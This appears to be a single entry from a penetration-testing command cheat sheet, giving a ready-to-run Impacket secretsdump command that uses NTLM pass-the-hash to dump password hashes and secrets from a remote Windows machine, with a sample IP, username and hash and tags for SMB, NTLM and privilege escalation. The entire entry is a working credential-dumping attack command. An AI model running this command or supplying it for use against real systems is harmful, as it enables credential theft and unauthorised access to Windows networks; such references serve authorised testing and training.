---
description: Dump password hashes and secrets from a remote Windows machine using Impacket's secretsdump with NTLM Pass-the-Hash.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  impacket-secretsdump -hashes 00000000000000000000000000000000:580B16D486D8D2CAFA00B314D41FA396 john@10.10.10.1

items:
  - Hash

services:
  - SMB
  - NTLM

OS:
  - Windows

attack_types:
  - Enumeration
  - PrivEsc

references:
  - https://github.com/fortra/impacket
---
